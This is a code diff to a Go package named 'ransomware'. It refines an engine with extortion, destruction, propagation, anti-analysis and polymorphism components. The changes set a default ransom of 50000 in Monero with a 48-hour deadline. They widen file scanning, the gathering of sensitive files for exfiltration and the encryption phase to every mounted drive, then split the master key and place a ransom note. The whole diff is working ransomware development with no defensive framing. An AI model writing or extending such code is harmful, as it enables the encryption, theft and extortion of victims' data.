@@ -3,6 +3,7 @@ package ransomware
 import (
 	"context"
 	"fmt"
+	"io/fs"
 	"net"
 	"os"
 	"path/filepath"
@@ -30,24 +31,55 @@ type Engine struct {
 }
 
 func NewEngine(cfg *RansomwareConfig) (*Engine, error) {
+	if cfg == nil {
+		return nil, fmt.Errorf("config is nil")
+	}
+	if len(cfg.EncryptExtensions) == 0 {
+		return nil, fmt.Errorf("config.EncryptExtensions must not be empty (no files to encrypt)")
+	}
+	if cfg.ShamirParts < 2 || cfg.ShamirThreshold < 2 {
+		return nil, fmt.Errorf("config.ShamirParts and ShamirThreshold must be >= 2")
+	}
+	if cfg.RansomAmount <= 0 {
+		cfg.RansomAmount = 50000
+	}
+	if cfg.RansomCurrency == "" {
+		cfg.RansomCurrency = "XMR"
+	}
+	if cfg.DeadlineHours <= 0 {
+		cfg.DeadlineHours = 48
+	}
+	if cfg.MaxFileSize <= 0 {
+		cfg.MaxFileSize = 100 * 1024 * 1024
+	}
+	if cfg.ScanWorkers <= 0 {
+		cfg.ScanWorkers = 8
+	}
+	if cfg.EncryptWorkers <= 0 {
+		cfg.EncryptWorkers = 4
+	}
+	if cfg.ExcludePaths == nil {
+		cfg.ExcludePaths = []string{"/proc", "/sys", "/dev", "/run", "/boot"}
+	}
+
 	hydra, err := NewHydraEngine(cfg)
 	if err != nil {
 		return nil, fmt.Errorf("hydra engine: %w", err)
 	}
 
-	scanner := NewRegexEngine(8)
+	scanner := NewRegexEngine(cfg.ScanWorkers)
 
 	return &Engine{
-		Config:       cfg,
-		Scanner:      scanner,
-		Crypto:       hydra,
-		Extortion:    NewExtortionEngine(cfg),
-		Destruction:  NewDestructionEngine(cfg),
-		Propagation:  NewPropagationEngine(cfg),
+		Config:        cfg,
+		Scanner:       scanner,
+		Crypto:        hydra,
+		Extortion:     NewExtortionEngine(cfg),
+		Destruction:   NewDestructionEngine(cfg),
+		Propagation:   NewPropagationEngine(cfg),
 		Psychological: NewPsychologicalEngine(cfg),
-		AntiAnalysis: NewAntiAnalysisEngine(cfg),
-		Polymorph:    NewPolymorphEngine(cfg),
-		Trust:        NewTrustExploitEngine(cfg),
+		AntiAnalysis:  NewAntiAnalysisEngine(cfg),
+		Polymorph:     NewPolymorphEngine(cfg),
+		Trust:         NewTrustExploitEngine(cfg),
 	}, nil
 }
 
@@ -94,34 +126,46 @@ func (e *Engine) phaseScan(ctx context.Context) PhaseReport {
 		return PhaseReport{Phase: PhaseScan, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
 	}
 
-	scanRoot := "/"
+	scanCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
+	defer cancel()
+
+	scanRoots := getMountPoints()
+	if len(scanRoots) == 0 {
+		scanRoots = []string{"/"}
+	}
 	if runtime.GOOS == "windows" {
-		scanRoot = "C:\\"
+		scanRoots = []string{"C:\\", "D:\\"}
 	}
 
-	results := make(chan ScanResult, 1000)
-	sensitive := make(chan SensitiveData, 1000)
-	done := make(chan struct{})
+	results := make(chan ScanResult, 100)
+	sensitive := make(chan SensitiveData, 100)
 
 	var allResults []ScanResult
 	var allSensitive []SensitiveData
+	var scanErr error
 
 	go func() {
 		for r := range results {
 			allResults = append(allResults, r)
 		}
-		close(sensitive)
 	}()
 
 	go func() {
 		for s := range sensitive {
 			allSensitive = append(allSensitive, s)
 		}
-		close(done)
 	}()
 
-	scanErr := e.Scanner.ScanDirectory(scanRoot, e.Config.ExcludePaths, results, sensitive)
-	<-done
+	for _, root := range scanRoots {
+		if scanErr = e.Scanner.ScanDirectory(scanCtx, root, e.Config.ExcludePaths, results, sensitive); scanErr != nil {
+			break
+		}
+		select {
+		case <-scanCtx.Done():
+			break
+		default:
+		}
+	}
 
 	e.mu.Lock()
 	e.report.FilesScanned = len(allResults)
@@ -130,8 +174,8 @@ func (e *Engine) phaseScan(ctx context.Context) PhaseReport {
 
 	scanned, matched := e.Scanner.Stats()
 
-	detail := fmt.Sprintf("scanned=%d matched=%d files=%d sensitive=%d", scanned, matched, len(allResults), len(allSensitive))
-	success := scanErr == nil || len(allResults) > 0
+	detail := fmt.Sprintf("scanned=%d matched=%d files=%d sensitive=%d roots=%v", scanned, matched, len(allResults), len(allSensitive), scanRoots)
+	success := (scanErr == nil || scanErr == context.DeadlineExceeded || scanErr == context.Canceled) && len(allResults) > 0
 
 	return PhaseReport{
 		Phase:     PhaseScan,
@@ -150,25 +194,40 @@ func (e *Engine) phaseExfil(ctx context.Context) PhaseReport {
 		return PhaseReport{Phase: PhaseExfil, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
 	}
 
-	var sensitiveFiles []string
+	exfilCtx, cancel := context.WithTimeout(ctx, 20*time.Second)
+	defer cancel()
 
-	scanRoot := "/"
+	var sensitiveFiles []string
+	roots := getMountPoints()
+	if len(roots) == 0 {
+		roots = []string{"/"}
+	}
 	if runtime.GOOS == "windows" {
-		scanRoot = "C:\\"
+		roots = []string{"C:\\"}
 	}
 
-	filepath.Walk(scanRoot, func(path string, info os.FileInfo, err error) error {
-		if err != nil || info.IsDir() {
+	for _, root := range roots {
+		filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
+			select {
+			case <-exfilCtx.Done():
+				return exfilCtx.Err()
+			default:
+			}
+			if err != nil || d.IsDir() {
+				return nil
+			}
+			if e.Config.ShouldExfil(path) {
+				sensitiveFiles = append(sensitiveFiles, path)
+			}
+			if len(sensitiveFiles) >= 100 {
+				return fmt.Errorf("limit")
+			}
 			return nil
-		}
-		if e.Config.ShouldExfil(path) {
-			sensitiveFiles = append(sensitiveFiles, path)
-		}
+		})
 		if len(sensitiveFiles) >= 100 {
-			return fmt.Errorf("limit")
+			break
 		}
-		return nil
-	})
+	}
 
 	if len(sensitiveFiles) > 0 {
 		pkg, _ := e.Extortion.PackageSensitiveData(sensitiveFiles, "")
@@ -197,19 +256,39 @@ func (e *Engine) phaseEncrypt(ctx context.Context) PhaseReport {
 		return PhaseReport{Phase: PhaseEncrypt, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
 	}
 
-	scanRoot := "/"
+	encryptCtx, cancel := context.WithTimeout(ctx, 5*time.Minute)
+	defer cancel()
+
+	roots := getMountPoints()
+	if len(roots) == 0 {
+		roots = []string{"/"}
+	}
 	if runtime.GOOS == "windows" {
-		scanRoot = "C:\\"
+		roots = []string{"C:\\"}
 	}
 
-	encrypted, err := e.Crypto.EncryptDirectory(scanRoot, e.Config.EncryptExtensions, e.Config.DoubleEncryptCritical)
-	if err != nil {
+	var totalEncrypted int
+	for _, root := range roots {
+		select {
+		case <-encryptCtx.Done():
+			break
+		default:
+		}
+		enc, err := e.Crypto.EncryptDirectory(encryptCtx, root, e.Config)
+		if err != nil && err != context.DeadlineExceeded && err != context.Canceled {
+			continue
+		}
+		totalEncrypted += enc
 	}
 
 	e.Crypto.SplitMasterKey()
 
-	note := e.Extortion.GenerateRansomNote(companyNameForReport(scanRoot))
-	if deployErr := e.Extortion.DeployRansomNote(scanRoot, note); deployErr != nil {
+	note := e.Extortion.GenerateRansomNote(companyNameForReport(roots[0]))
+	for _, root := range roots {
+		if deployErr := e.Extortion.DeployRansomNote(root, note); deployErr != nil {
+			continue
+		}
+		break
 	}
 
 	e.mu.Lock()
@@ -217,7 +296,7 @@ func (e *Engine) phaseEncrypt(ctx context.Context) PhaseReport {
 	e.report.RansomNoteDeployed = true
 	e.mu.Unlock()
 
-	detail := fmt.Sprintf("encrypted=%d", encrypted)
+	detail := fmt.Sprintf("encrypted=%d roots=%v", totalEncrypted, roots)
 
 	return PhaseReport{
 		Phase:     PhaseEncrypt,
@@ -329,6 +408,42 @@ func (e *Engine) Report() *RansomwareReport {
 	e.mu.Lock()
 	defer e.mu.Unlock()
 	return e.report
+}
+
+func getMountPoints() []string {
+	if runtime.GOOS == "windows" {
+		return []string{"C:\\"}
+	}
+	data, err := os.ReadFile("/proc/mounts")
+	if err != nil {
+		return []string{"/"}
+	}
+	var mounts []string
+	seen := map[string]bool{"/": true}
+	mounts = append(mounts, "/")
+	for _, line := range strings.Split(string(data), "\n") {
+		fields := strings.Fields(line)
+		if len(fields) < 2 {
+			continue
+		}
+		mp := fields[1]
+		dev := fields[0]
+		if !strings.HasPrefix(dev, "/dev/") {
+			continue
+		}
+		if strings.HasPrefix(mp, "/proc") || strings.HasPrefix(mp, "/sys") ||
+			strings.HasPrefix(mp, "/dev") || strings.HasPrefix(mp, "/run") {
+			continue
+		}
+		if mp != "/" && strings.HasPrefix(mp, "/") && !seen[mp] {
+			seen[mp] = true
+			mounts = append(mounts, mp)
+		}
+	}
+	if len(mounts) == 1 {
+		mounts = append(mounts, "/home", "/var", "/tmp")
+	}
+	return mounts
 }
 
 func companyNameForReport(root string) string {
